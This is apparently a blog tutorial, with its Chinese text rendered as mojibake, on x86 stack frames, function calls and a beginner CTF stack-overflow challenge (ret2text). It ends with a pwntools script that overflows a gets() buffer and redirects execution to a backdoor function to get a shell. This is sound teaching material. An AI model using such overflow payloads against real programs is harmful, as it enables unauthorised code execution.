    <content type="html"><![CDATA[<h2 id="è®¤è¯†æ ˆç»“æ„"><a href="#è®¤è¯†æ ˆç»“æ„" class="headerlink" title="è®¤è¯†æ ˆç»“æ„"></a>è®¤è¯†æ ˆç»“æ„</h2><p><strong>æ ˆè¿™ç§ç»“æ„å­¦è¿‡æ•°æ®ç»“æ„çš„éƒ½çŸ¥é“ï¼Œæ˜¯ä¸€ç§å…ˆè¿›åå‡ºçš„ç»“æ„ï¼Œç±»ä¼¼äºå­å¼¹æ”¾è¿›å¼¹å¤¹ä¸€æ ·ï¼Œå…ˆæ”¾è¿›çš„å­å¼¹æœ€åæ‰“å‡ºã€‚</strong></p><h2 id="å‡½æ•°è°ƒç”¨è¿‡ç¨‹"><a href="#å‡½æ•°è°ƒç”¨è¿‡ç¨‹" class="headerlink" title="å‡½æ•°è°ƒç”¨è¿‡ç¨‹"></a>å‡½æ•°è°ƒç”¨è¿‡ç¨‹</h2><p><strong>è¿™ä¸ªçŸ¥è¯†æ˜¯æ•´ä¸ªæ ˆæ–¹é¢çš„å…³é”®çŸ¥è¯†ï¼Œæˆ‘åœ¨å¤§ä¸€çš„æ—¶å€™å­¦pwnæ€ä¹ˆä¹Ÿå­¦ä¸ä¼šï¼Œå°±æ˜¯å¿½ç•¥äº†å¯¹åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ï¼Œç›´æ¥å­¦æ¼æ´ï¼Œä¸€ç›´æä¸æ¸…æ€ä¹ˆå›äº‹ï¼Œéå¸¸éƒé—·ã€‚ç°åœ¨è¯¦ç»†æ€»ç»“ä¸€ä¸‹å‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼Œä»¥X86ç³»ç»Ÿä¸ºä¾‹</strong></p><ol><li><p>å‹å…¥å‚æ•°<br><strong>æ ¹æ®è°ƒç”¨çº¦å®šå‹å…¥å‚æ•°ï¼Œmainå‡½æ•°ä½œä¸ºè°ƒç”¨è€…ï¼Œé¦–å…ˆå°†funçš„å‚æ•°a,bâ€¦å‹æ ˆã€‚æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œå…ˆå‹å…¥çš„å‚æ•°é è¿‘æ ˆé¡¶espï¼Œåå‹å…¥çš„é è¿‘æ ˆåº•edp</strong></p></li><li><p>è¿”å›åœ°å€å‹å…¥<br><strong>funå‡½æ•°è°ƒç”¨å®Œæˆï¼Œç¨‹åºéœ€è¦è¿”å›æºåœ°å€ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»è¦ä¿å­˜è°ƒç”¨å‡½æ•°ä¸‹ä¸€å¥çš„åœ°å€ï¼ŒæŠŠå®ƒå‹å…¥æ ˆä¸­ï¼Œä»¥ä¾¿æˆ‘ä»¬æ¢å¤åŸç¨‹åºç»§ç»­æ‰§è¡Œ</strong></p></li><li><p>funå‡½æ•°è¿è¡Œ<br><strong>funå‡½æ•°è¿è¡Œä¼šç»™è‡ªå·±å†å¼€è¾Ÿä¸€ä¸ªæ ˆï¼Œè¿™ä¸ªæ ˆçš„æ ˆåº•å°±æ˜¯ä¸Šä¸ªæ ˆçš„æ ˆé¡¶ï¼Œå› ä¸ºå½“è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ‰§è¡Œcallå‘½ä»¤ï¼Œä¼šæ‰§è¡Œè¿™å‡ æ¡æ±‡ç¼–â€˜push edpï¼›mov edp ï¼Œespï¼›sub espï¼Œ0x â€™è¿™å¥è¯å¯ä»¥ç”»å›¾æ¥ä½“ä¼šä¸€ä¸‹ã€‚push edpï¼›æ˜¯ä¸ºäº†ä¿å­˜è°ƒç”¨å‡½æ•°çš„æ ˆå¸§ï¼Œè°ƒç”¨å‡½æ•°ç»“æŸåè¦æ¢å¤åŸå‡½æ•°çš„edpï¼Œespã€‚mov edp ï¼Œespï¼›æŠŠespçš„å€¼èµ‹å€¼ç»™edpï¼Œè¿™æ ·å°±æŠŠæ–°æ ˆå¸§çš„æ ˆåº•ç¡®å®šäº†ã€‚sub esp ï¼Œ0xï¼Œè¿™å¥è¯ä¸ºæ ˆå¼€è¾Ÿç©ºé—´ï¼Œespå°±ç¡®å®šäº†ï¼Œå®Œæˆä¸€ä¸ªæ–°æ ˆå¼€è¾Ÿ</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png"></p></li><li><p>funå‡½æ•°è¿”å›<br><strong>å½“å‡½æ•°è¿è¡Œå®Œæˆä¹‹åï¼Œå‡½æ•°è¿™ä¹ˆè¿”å›å‘¢ï¼Ÿå‡½æ•°ä¸€èˆ¬ä¼šæ‰§è¡Œâ€˜leaveï¼›retï¼›â€™è¿™å¥è¯ä»€ä¹ˆå«ä¹‰ï¼Œå°±æ˜¯â€˜mov esp ï¼Œedpï¼›pop edpï¼›pop eipâ€™ æˆ‘ä»¬æ¥è§£è¯»ä¸€ä¸‹ï¼Œé¦–å…ˆæŠŠæ ˆé¡¶ç§»åŠ¨åˆ°æ ˆåº•ï¼Œç›¸å½“äºæ¢å¤æ ˆé¡¶ï¼Œä»”ç»†æƒ³ä¸€æƒ³ï¼Œæ˜¯ä¸æ˜¯funè°ƒç”¨çš„æ—¶å€™ï¼ŒæŠŠedpç§»åŠ¨åˆ°espã€‚ç„¶åpop edp æŠŠæ ˆä¸­å‹å…¥çš„main_edpå¼¹å‡ºèµ‹å€¼ç»™edpï¼Œè¿™æ ·æˆ‘ä»¬å°±æ¢å¤äº†edpï¼Œç„¶åå†pop eipï¼ŒæŠŠå‹å…¥çš„main_addrå¼¹å‡ºèµ‹å€¼ç»™eipç¨‹åºæ§åˆ¶æµå°±æœ‰å›åˆ°äº†callçš„ä¸‹ä¸€å¥</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341909.png"></p></li></ol><h3 id="å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤"><a href="#å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤" class="headerlink" title="å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤"></a>å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤</h3><ol><li><strong>å‹æ ˆ(push):æ ˆé¡¶æŒ‡é’ˆespå‡å°4å­—èŠ‚;ä»¥å­—èŠ‚ä¸ºå•ä½å°†å¯„å­˜å™¨æ•°æ®(4å­—èŠ‚ï¼Œä¸è¶³è¡¥0)å‹å…¥å †æ ˆï¼Œä»é«˜åˆ°ä½ä¾æ¬¡å°†æ•°æ®å­˜äººesp-1ã€esp-2ã€esp-3ã€esp-4æŒ‡å‘çš„åœ°å€å•å…ƒã€‚</strong></li><li><strong>å‡ºæ ˆ(pop):æ ˆé¡¶æŒ‡é’ˆespæŒ‡å‘çš„æ ˆä¸­æ•°æ®è¢«å–å›å¯„å­˜å™¨;æ ˆé¡¶æŒ‡é’ˆespå¢åŠ 4å­—èŠ‚ã€‚pushå’ŒpopæŒ‡ä»¤åœ¨ä¸åŒç³»ç»Ÿä¸Šè¿è¡Œæ—¶ç¨æœ‰ä¸åŒï¼Œåœ¨64ä½ç³»ç»Ÿä¸­å˜åŒ–çš„å¤§å°æ˜¯8å­—èŠ‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸­å˜åŒ–çš„å¤§å°æ˜¯4å­—èŠ‚ã€‚</strong></li><li><strong>è°ƒç”¨(ca11):å°†å½“å‰çš„æŒ‡ä»¤æŒ‡é’ˆeip(è¯¥æŒ‡é’ˆæŒ‡å‘ca11æŒ‡ä»¤åçš„ä¸‹æ¡æŒ‡ä»¤)å‹å…¥å †æ ˆï¼Œä»¥è¿”å›æ—¶èƒ½æ¢å¤æ‰§è¡Œä¸‹æ¡æŒ‡ä»¤ã€‚ç„¶åï¼Œè®¾ç½®eipæŒ‡å‘è¢«è°ƒå‡½æ•°çš„å¼€å§‹å¤„ï¼Œä»¥è·³è½¬åˆ°è¢«è°ƒå‡½æ•°çš„å…¥å£åœ°å€å¤„æ‰§è¡Œã€‚</strong></li><li><strong>ç¦»å¼€(1eave):æ¢å¤ä¸»è°ƒå‡½æ•°çš„æ ˆå¸§ä»¥å‡†å¤‡è¿”å›ï¼Œå®ƒç­‰ä»·äºä»¥ä¸‹æŒ‡ä»¤åºåˆ—:mov espï¼Œebp(æ¢å¤åŸespå€¼ï¼ŒæŒ‡å‘è¢«è°ƒå‡½æ•°æ ˆå¸§å¼€å§‹å¤„); pop ebp(æ¢å¤åŸ ebp çš„å€¼ï¼Œå³ä¸»è°ƒå‡½æ•°å¸§åŸºæŒ‡é’ˆ)</strong></li><li><strong>è¿”å›(ret):ä¸ca11æŒ‡ä»¤é…åˆï¼Œç”¨äºä»å‡½æ•°æˆ–è¿‡ç¨‹è¿”å›ã€‚ä»æ ˆé¡¶å¼¹å‡ºè¿”å›åœ°å€(ä¹‹å‰ ca11æŒ‡ä»¤ä¿å­˜çš„ä¸‹æ¡æŒ‡ä»¤åœ°å€)åˆ°eipå¯„å­˜å™¨ä¸­ï¼Œç¨‹åºè½¬åˆ°è¯¥åœ°å€å¤„ç»§ç»­æ‰§è¡Œ(æ­¤æ—¶ espæŒ‡å‘è¿›äººå‡½æ•°æ—¶çš„ç¬¬ä¸€ä¸ªå‚æ•°)ã€‚è‹¥å¸¦æœ‰ç«‹å³æ•°ï¼Œespè¦åŠ ä¸Šç«‹å³æ•°(ä¸¢å¼ƒä¸€äº›åœ¨æ‰§è¡Œca11æŒ‡ä»¤å‰å…¥æ ˆçš„å‚æ•°)ã€‚ä½¿ç”¨è¯¥æŒ‡ä»¤å‰ï¼Œåº”ä½¿å½“å‰æ ˆé¡¶æŒ‡é’ˆæ‰€æŒ‡å‘ä½ç½®çš„å†…å®¹æ­£å¥½æ˜¯å…ˆå‰ca11æŒ‡ä»¤ä¿å­˜çš„è¿”å›åœ°å€ã€‚</strong></li></ol><h2 id="åˆè¯†æ ˆæº¢å‡º"><a href="#åˆè¯†æ ˆæº¢å‡º" class="headerlink" title="åˆè¯†æ ˆæº¢å‡º"></a>åˆè¯†æ ˆæº¢å‡º</h2><p><strong>å½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œåœ¨å‡½æ•°å†…éƒ¨å­˜åœ¨ï¼Œæ ˆæº¢å‡ºæ¼æ´ï¼Œgetå‡½æ•°æˆ–è€…å¼€è¾Ÿç©ºé—´å¤§äºå˜é‡è·ç¦»æ ˆåº•çš„ä½ç½®ï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ æˆæ ˆæº¢å‡ºï¼Œæº¢å‡ºåå¦‚æœæº¢å‡ºå€¼è¦†ç›–äº†main_addr,å‡½æ•°çš„è¿”å›åœ°å€å°±ä¼šå˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªç‰¹ç‚¹ï¼Œç¯¡æ”¹è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¿”å›çš„ã€‚çœ‹ä¸‹å›¾ï¼Œè·ç¦»æ ˆåº•0x80ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å…è®¸è¯»å–0x200ä¸ªå­—èŠ‚ï¼Œå°±ä¼šé€ æˆæ ˆæº¢å‡º,æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•ç‰›åˆ€</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342005.png"><br>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">é™„ä»¶ä¸‹è½½</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342145.png"><br><strong>æŸ¥çœ‹ä¿æŠ¤</strong><br><strong>æ‰“å¼€IDAåç¼–è¯‘çœ‹çœ‹ä»£ç é€»è¾‘</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343292.png"><br><strong>è¿™é‡Œæœ‰ä¸¤ç§åˆ¤æ–­åç§»çš„æ–¹å¼</strong></p><ol><li><p>ç¬¬ä¸€ç§å°±æ˜¯çœ‹å›¾ç‰‡ä¸Šçº¢æ¡†éƒ¨åˆ†ï¼Œæ˜¾ç¤ºsè·ç¦»ebpä¸º0x108ä¸ªå­—èŠ‚æ‰€ä»¥éœ€è¦å¡«å……0x108+0x4ä¸ªå­—èŠ‚çš„æ•°æ®æ‰èƒ½è¦†ç›–è¿”å›åœ°å€</p></li><li><p>ä½¿ç”¨pwngdbä¸­cyclicåˆ¤æ–­åç§»ï¼Œåœ¨call getså¤„ä¸‹æ–­ç‚¹ï¼Œç”¨gdbè°ƒè¯•<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346316.png"><br> ç”¨cyclicç”Ÿæˆæœ‰è§„å¾‹çš„å­—ç¬¦ä¸²ï¼Œè¾“å…¥cæŠŠå­—ç¬¦ä¸²è¾“å…¥è¿è¡Œ<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343102.png"><br> å¾—åˆ°ä¸€ä¸ªå¼‚å¸¸è¿”å›åœ°å€ï¼Œç¨‹åºåœæ­¢<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344907.png"><br> ç”¨å‘½ä»¤cyclic -l åŠ è¿”å›åœ°å€ç®—å‡ºåç§»<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344504.png"><br> <strong>è¿™é‡Œçš„åˆ°çš„åç§»å°±ä¸ç”¨ç®—edpçš„å¤§å°äº†ï¼Œå› ä¸ºå·²ç»åŒ…æ‹¬edpäº†</strong><br> <strong>æœ‰äº†åç§»æˆ‘ä»¬æ‰¾ä¸€ä¸‹åé—¨å‡½æ•°</strong></p></li></ol><p>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344083.png"><br>  <strong>è¿™é¢˜ä¹Ÿç®—å¾ˆä»æ…ˆï¼Œç›´æ¥ç»™å‡ºäº†åé—¨å‡½æ•°ï¼Œæˆ‘ä»¬éšç€å­¦ä¹ çš„æ·±å…¥ï¼Œä¸€èˆ¬ä¸ä¼šç›´æ¥ç»™å‡ºåé—¨å‡½æ•°ï¼Œéœ€è¦ä½¿ç”¨å„ç§æŠ€å·§æ¥è¿›å…¥shell</strong><br>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182345121.png"><br>  <strong>æ¥ä¸‹æ¥å¼€å§‹ç¼–å†™è„šæœ¬</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
